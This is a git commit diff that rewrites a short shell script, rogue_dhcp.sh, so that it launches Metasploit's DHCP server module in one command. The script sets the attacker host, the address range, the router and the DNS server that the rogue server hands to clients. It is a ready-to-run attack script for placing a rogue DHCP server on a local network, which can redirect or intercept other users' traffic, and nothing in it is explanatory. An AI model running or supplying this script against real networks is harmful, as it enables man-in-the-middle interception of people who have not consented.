e7668b81d0ea46f79ea0f557198b50b2fbdc6704
S3298GIT01 <144739078+S3298GIT01@users.noreply.github.com>
2025-04-28 16:15:58 -0400

    Update rogue_dhcp.sh

--- rogue_dhcp.sh
+++ rogue_dhcp.sh
@@ -1,5 +1,12 @@
 #!/bin/bash
 
-msfconsole
-use auxiliary/server/dhcp
-set SRVHOST 192.168.10.23
+msfconsole -x "
+use auxiliary/server/dhcp;
+set SRVHOST 192.168.10.23;
+set DHCPIPSTART 192.168.10.35;
+set DHCPIPEND 192.168.10.200;
+set NETMASK 255.255.255.0;
+set ROUTER 192.168.10.1;
+set DNSSERVER 1.1.1.1;
+run"
+
